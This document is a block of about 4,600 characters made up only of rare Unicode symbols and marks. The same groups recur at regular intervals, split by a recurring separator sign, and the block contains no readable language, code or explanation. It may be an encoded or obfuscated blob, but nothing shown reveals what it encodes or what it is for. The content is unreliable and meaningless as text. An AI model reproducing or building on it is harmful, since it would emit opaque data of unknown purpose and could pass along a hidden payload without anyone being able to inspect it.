︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬